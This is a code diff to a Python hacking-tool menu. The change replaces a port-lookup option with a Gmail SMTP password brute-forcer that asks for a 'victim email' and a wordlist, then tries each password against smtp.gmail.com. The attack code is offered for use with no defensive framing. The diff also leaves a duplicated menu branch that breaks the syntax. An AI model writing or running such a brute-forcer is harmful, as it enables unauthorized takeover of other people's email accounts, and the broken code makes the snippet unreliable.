@@ -125,11 +125,27 @@ def menu():
                           print ("ʏᴏᴜʀ ʜᴀꜱʜ ɪꜱ ɴᴏᴛ ꜰᴏᴜɴᴅ ========> [-] " , text.decode("UTF-8"))
                           
        elif choise == "3":
-                   import socket
+                   import smtplib
+                   SmtpServer = smtplib.SMTP("smtp.gmail.com",587)
+                   SmtpServer.ehlo()
+                   SmtpServer.starttls()
                    print("")
-                   service=str(input("𝔼𝕟𝕥𝕖𝕣 𝕊𝕖𝕣𝕧𝕚𝕔𝕖 𝕐𝕠𝕦 𝕎𝕒𝕟𝕥 𝕋𝕠 𝔾𝕖𝕥 :"))
-                   port = socket.getservbyname(service)
-                   print("\033[;32m=============================>",port) 
+
+
+                   USER = str(input("𝓔𝓷𝓽𝓮𝓻 𝓨𝓸𝓾𝓻  𝓥𝓲𝓬𝓽𝓲𝓶 𝓔𝓶𝓪𝓲𝓵: "))
+                   print("")
+                   PASSWORD_LIST = str(input("𝓔𝓷𝓽𝓮𝓻 𝓨𝓸𝓾𝓻 𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭 𝓛𝓲𝓼𝓽: "))
+                   print("")
+                   PASSLIST_OPEN  = open(PASSWORD_LIST,'r')
+                   for password in PASSLIST_OPEN:
+                       try:
+                            SmtpServer.login(USER,password)
+                            print("\033[1;32m𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 𝙁𝙤𝙪𝙣𝙙 ===================================================> [+] ", password)
+                       except smtplib.SMTPAuthenticationError:
+                            print("\033[1;32m𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱 ===================> [-]  ", password)          
+
+
+       elif choise == "4":
        elif choise == "4":
                    import socket
                    port=int(input("ᴇɴᴛᴇʀ ᴘᴏʀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇᴛ :"))
